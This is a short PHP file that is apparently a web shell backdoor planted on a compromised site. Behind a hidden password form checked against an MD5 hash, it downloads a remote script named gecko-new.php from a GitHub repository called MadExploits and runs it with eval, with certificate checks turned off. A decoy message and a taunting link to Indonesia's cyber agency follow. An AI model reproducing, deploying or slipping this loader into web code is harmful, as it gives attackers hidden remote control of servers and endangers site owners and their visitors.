<?php
session_start();
function g($u){if(function_exists('curl_exec')){$c=curl_init($u);curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_USERAGENT=>"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0,CURLOPT_COOKIE=>isset($_SESSION['SAP'])?$_SESSION['SAP']:[]]);$r=curl_exec($c);curl_close($c);}elseif(function_exists('file_get_contents')){$r=file_get_contents($u);}elseif(function_exists('fopen')&&function_exists('stream_get_contents')){$h=fopen($u,"r");$r=stream_get_contents($h);fclose($h);}else{$r=false;}return$r;}function i(){return isset($_SESSION['logged_in'])&&$_SESSION['logged_in']===true;}if(isset($_POST['password'])){$e=$_POST['password'];$h='a95c777028b2e3653a012232c6a8cca1';if(md5($e)===$h){$_SESSION['logged_in']=true;$_SESSION['SAP']='love';}}if(i()){$a=g('https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php');eval('?>'.$a);}else{?>
<!DOCTYPE html><html><head><style>input{border:0}input:focus{outline:0;border:none;box-shadow:none}</style></head><body><form method="post"><input style="border:0 solid #fff" type="password" name="password"></form></body></html> <?php } ?>
<?php
$showHiddenFile = false; 
echo "<h1>Ngapain?</h1>";
if ($showHiddenFile) {
    echo "<div><p>This is a hidden file or content.</p></div>";
}
?>
<button onclick="window.location.href='www.bssn.go.id'">Track me.</button>
<script>
</script>
